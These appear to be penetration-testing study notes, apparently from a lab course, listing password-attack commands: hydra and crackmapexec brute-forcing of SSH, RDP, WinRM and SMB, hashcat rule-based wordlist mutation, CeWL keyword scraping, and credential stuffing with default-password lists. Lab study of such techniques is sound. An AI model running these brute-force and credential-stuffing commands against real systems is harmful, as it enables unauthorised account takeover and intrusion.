### Network Services

```bash
# tools
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist> # crackmapexec

# WinRM (5985,5986)
crackmapexec winrm 10.129.213.36 -u user.list -p password.list
evil-winrm -i 10.129.42.197 -u user -p password # CONNECT

# SSH (22 TCP )
hydra -L user.list -P password.list ssh://10.129.42.197 

# RDP (3389 TCP)
hydra -L user.list -P password.list rdp://10.129.42.197 -c 3 # -c wait time
xfreerdp /v:<target-IP> /u:<username> /p:<password> # CONNECT 

#SMB (139 , 445 TCP)
hydra -L user.list -P password.list smb://10.129.42.197
msf6 auxiliary(scanner/smb/smb_login)
smbclient -U '<user>%pass' -L  //<ip> # list folder
smbclient -U user \\\\10.129.42.197\\<folder> # CONNECT 
```

### Password Mutation
```bash
# Basic idea: Users make predictable password mutations (e.g. Name2024!, P@ssw0rd).
# Use Hashcat rules to generate realistic mutations.

# Sample password list
cat password.list
# rawen

# Sample custom Hashcat rule file
cat custom.rule
# :
# c                 # Capitalize first letter
# so0               # Replace o with 0
# sa@               # Replace a with @
# $!                # Add '!' at the end
# combinations like:
# $! c so0 sa@      # Add '!', capitalize, o→0, a→@

# Generate mutated password list with Hashcat rules
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

# One of the most used rules is best64.rule, which can often lead to good results
sed -ri '/^.{,9}$/d' mut_password.list  # Remove all passwords shorter than 10 with sed -ri '/^.{,9}$/d' mut_password.list 

# Use existing rules (e.g., best64.rule)
ls /usr/share/hashcat/rules/
# best64.rule, toggles1.rule, leetspeak.rule, etc.

# Extract potential keywords from a website using CeWL
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Count words in generated list
wc -l inlane.wordlist
# Example output: 326
```
### Password Reuse / Default Passwords
```bash
# Credential Stuffing
# - Using known default credentials or leaked credential combos.
# - Example list: DefaultCreds-Cheat-Sheet. https://github.com/ihebski/DefaultCreds-cheat-sheet 
creds search kali

#  Hydra Syntax for Credential Stuffing
hydra -C <user_pass.list> <protocol>://<IP>
hydra -C user_pass.list ssh://10.129.42.197 #Example (SSH)
```